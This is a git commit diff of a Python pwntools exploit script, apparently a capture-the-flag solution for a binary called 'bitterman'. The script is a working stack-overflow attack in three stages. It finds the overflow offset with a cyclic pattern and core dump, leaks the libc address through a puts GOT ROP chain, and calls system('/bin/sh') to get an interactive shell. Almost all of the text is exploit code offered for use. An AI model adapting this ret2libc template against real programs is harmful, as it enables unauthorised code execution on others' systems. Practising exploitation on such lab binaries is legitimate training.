b8a5c9da387580c3586572b056599d4204828c28
Filip Dragovic <44291883+Wh04m1001@users.noreply.github.com>
2018-10-23 04:21:37 -0400

    Update expl.py

--- bitterman/expl.py
+++ bitterman/expl.py
@@ -1,28 +1,54 @@
 #!/usr/bin/python2
 #Author: Wh04m1 (@filip_dragovic)
+
 from pwn import *
 
+if args['DEBUG']:
+	context.log_level='DEBUG'
+context.log_level='INFO'
 context(os='linux', arch='amd64')
-#context.log_level = "DEBUG"
-elf = ELF('./bitterman')
-rop = ROP(elf)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-rop.call(elf.sym.puts, [elf.got.puts])
-rop.call(elf.sym.main)
-log.info(rop.dump())
-p = process('./bitterman')
+
+#----- Stage1: Crash binary to find offset ----------
+info("Sending payload to crash binary ....\n\r")
+elf = ELF("./bitterman")
+p = process(elf.path)
+crash = cyclic(1024)
 p.recvuntil('name?')
 p.sendline("Wh04m1")
 p.recvuntil('message:')
 p.sendline('1024')
 p.recvuntil('text:')
-p.sendline(fit({152:rop.chain()}))
+p.sendline(crash)
+p.wait()
+core = p.corefile
+rsp = core.rsp
+offset = core.read(rsp, 4)
+offset =  cyclic_find(offset)
+success("Offset found @ {a} bytes\n\r".format(a=offset))
+
+#---- Stage2: Create rop chain to leak puts address  ------
+
+rop = ROP(elf)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+rop.call(elf.sym.puts, [elf.got.puts])
+rop.call(elf.sym.main)
+log.info(rop.dump())
+p = process(elf.path)
+p.recvuntil('name?')
+p.sendline("Wh04m1")
+p.recvuntil('message:')
+p.sendline('1024')
+p.recvuntil('text:')
+p.sendline(fit({offset:rop.chain()}))
 p.recvuntil("Thanks!")
 leaked_puts = p.recv()[:8].strip().ljust(8, '\x00')
 libc.address = u64(leaked_puts) - libc.sym.puts
-log.success("puts will be @" + hex(u64(leaked_puts)))
-log.success("libc address will be @" + hex(libc.address))
+log.success("puts will be @{a}".format(a=hex(u64(leaked_puts))))
+log.success("libc address will be @{a}\n\r".format(a=hex(libc.address)))
+
+#---- Stage3: Get shell ------
+
 rop2 = ROP(libc)
 rop2.system(next(libc.search("/bin/sh\x00")))
 log.info(rop2.dump())
@@ -30,6 +56,6 @@ p.sendline("Wh04m1")
 p.recvuntil('message:')
 p.sendline('1024')
 p.recvuntil('text:')
-p.sendline(fit({152:rop2.chain()}))
+p.sendline(fit({offset:rop2.chain()}))
 p.recvlines(2)
 p.interactive()
